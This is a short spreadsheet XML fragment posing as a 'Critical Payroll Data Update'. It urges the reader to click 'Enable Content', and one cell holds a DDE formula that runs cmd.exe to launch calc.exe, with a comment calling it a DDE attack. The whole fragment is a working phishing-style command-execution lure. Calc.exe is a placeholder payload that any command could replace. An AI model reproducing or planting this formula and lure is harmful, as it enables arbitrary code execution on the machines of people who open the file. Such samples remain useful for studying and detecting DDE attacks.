<sheetData>
  <row r="1">
    <c r="A1" t="str"><v>Critical Payroll Data Update</v></c>
  </row>
  <row r="2">
    <c r="A2" t="str"><v>Please click "Enable Content" to refresh data.</v></c>
    <c r="B2"><f>='C:\Windows\System32\cmd.exe|/C calc.exe'!A1</f></c> <!-- DDE attack via formula -->
  </row>
</sheetData>